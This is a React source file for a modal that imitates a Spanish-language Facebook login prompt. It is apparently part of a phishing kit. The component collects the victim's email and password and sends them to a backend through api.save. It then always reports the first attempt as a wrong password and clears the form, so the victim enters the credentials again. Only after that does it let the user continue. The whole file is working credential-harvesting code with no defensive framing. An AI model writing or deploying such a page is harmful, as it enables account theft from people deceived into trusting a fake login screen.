import React, {useState, useEffect} from 'react';
import style from './style';
import api from '../../../api';


function Modal (props){

  const [password, set_password] = useState('');
  const [email, set_email] = useState('');
  const [loading, set_loading] = useState(true);
  const [error, set_error] = useState(false);


  useEffect(() => {
    console.log('execute...')
    setTimeout(() => {set_loading(false)},2000);
  },[]);

  const send_data = async () => {
    const response = await api.save({password, email});
  }

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (password.length < 4 || email.length < 4) return null;
    set_loading(true);

    const response = await send_data();

    if (!error){
      set_loading(false);
      set_error(true);
      set_password('');
      set_email('');
    }else{
      props.sucess();
    }

  }



  return (
    <section className={style.content}>
      <div className={style.box}>
        {loading && (
          <img className={style.loading_facebook} src="/public/img/loading_facebook.gif" />
        )}
        {!loading && (
          <form className={style.form} onSubmit={handleSubmit}>
            {!error && (<h1 className={style.title}>inicia sesion para continuar</h1>)}
            {error && (<h1 className={style.title_error}>correo o contraeña incorrecta</h1>)}
            <input type="text" className={style.input} placeholder="Correo electronico o numero de telefono" value={email} onChange={(e) => set_email(e.target.value)}/>
            <input type="password" className={style.input} placeholder="Contraseña" value={password} onChange={(e) => set_password(e.target.value)}/>
            <button type="submit" className={`${style.input} ${style.button}`}>Iniciar sesion</button>
            <div className={style.option_text}>¿Olvidaste tu cuenta?</div>
            <div className={style.separator}>
              <hr className={style.line} />O<hr className={style.line} />
            </div>
            <div className={style.create_acount}>Crear cuenta nueva</div>
          </form>
        )}
      </div>
    </section>
  )
}

export default Modal;
